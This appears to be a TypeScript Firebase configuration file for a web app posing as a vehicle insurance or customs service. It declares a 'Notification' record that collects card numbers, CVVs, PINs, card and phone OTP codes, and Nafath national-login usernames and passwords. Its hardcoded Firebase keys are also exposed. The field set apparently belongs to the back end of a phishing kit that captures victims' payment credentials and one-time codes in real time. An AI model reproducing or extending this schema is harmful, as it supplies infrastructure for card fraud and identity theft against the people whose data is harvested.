import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getDatabase } from "firebase/database";
import { getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBX7ZiWymksAT6HHEhr7Dn5MP5hbfxR0WI",
  authDomain: "trree-3500d.firebaseapp.com",
  databaseURL: "https://trree-3500d-default-rtdb.firebaseio.com",
  projectId: "trree-3500d",
  storageBucket: "trree-3500d.firebasestorage.app",
  messagingSenderId: "308719418224",
  appId: "1:308719418224:web:7fa716c10e3a5fa66a6db5",
  measurementId: "G-77L0KDW603"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database =getDatabase(app);

export interface PaymentData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
  card_Holder_Name?: string;
}

export interface FormData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  card_Holder_Name?: string;
}
export interface Notification {
  id: string;
  agreeToTerms?: boolean;
  card_Holder_Name?: string;
  card_number?: string;
  createdDate: string;
  customs_code?: string;
  cvv?: string;
  document_owner_full_name?: string;
  expiration_date?: string;
  formData?: FormData;
  full_name?: string;
  insurance_purpose?: string;
  owner_identity_number?: string;
  pagename?: string;
  paymentData?: PaymentData;
  paymentStatus?: string;
  phone?: string;
  phone2?: string;
  seller_identity_number?: string;
  serial_number?: string;
  status?: string;
  vehicle_manufacture_number?: string;
  documment_owner_full_name?: string;
  vehicle_type?: string;
  isHidden?: boolean;
  pinCode?: string;
  otpCardCode?: string;
  phoneOtp?: string;
  otpCode?: string;
  otpStatus?: string;
  externalUsername?: string;
  externalPassword?: string;
  nafadUsername?: string;
  nafadPassword?: string;
  nafaz_pin?: string;
  autnAttachment?: string;
  requierdAttachment?: string;
  operator?: string;
  otpPhoneStatus: string;
  isRead?: boolean;
  cardOtpStatus?: string;
  phoneVerificationStatus?: string;
  phoneOtpCode?: string;
  phoneOtpStatus?: string;
}


export { app, auth, db,database };
